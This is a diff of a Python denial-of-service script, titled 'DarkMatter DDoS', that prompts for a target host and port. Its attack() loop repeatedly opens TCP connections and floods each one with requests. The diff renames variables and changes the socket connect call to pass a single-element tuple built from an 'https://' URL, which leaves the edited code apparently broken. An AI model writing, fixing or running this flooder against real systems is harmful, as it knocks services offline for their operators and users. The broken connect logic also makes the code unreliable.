@@ -24,7 +24,7 @@ def progressbar(it, prefix="", size=60, file=sys.stdout):
 import time
 
 for i in progressbar(range(100), "Barra Util: ", 40):
-    time.sleep(0.2)
+    time.sleep(0.3)
     
     
 print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
@@ -56,7 +56,7 @@ def attack():
   while True:
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
+      atk.connect((url, ))
       #Attack starts here
       for y in range(80):
           atk.send(str.encode(request))
@@ -66,9 +66,9 @@ def attack():
       pass
 
 print("Bienvenido a DarkMatter DDoS\n")
-ip = input("IPV4/Domain: ")
+url = input("IPV4/Domain: ")
 port = int(input("Port: "))
-url = f"http://{str(ip)}"
+url = f"https://{str(url)}"
 print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
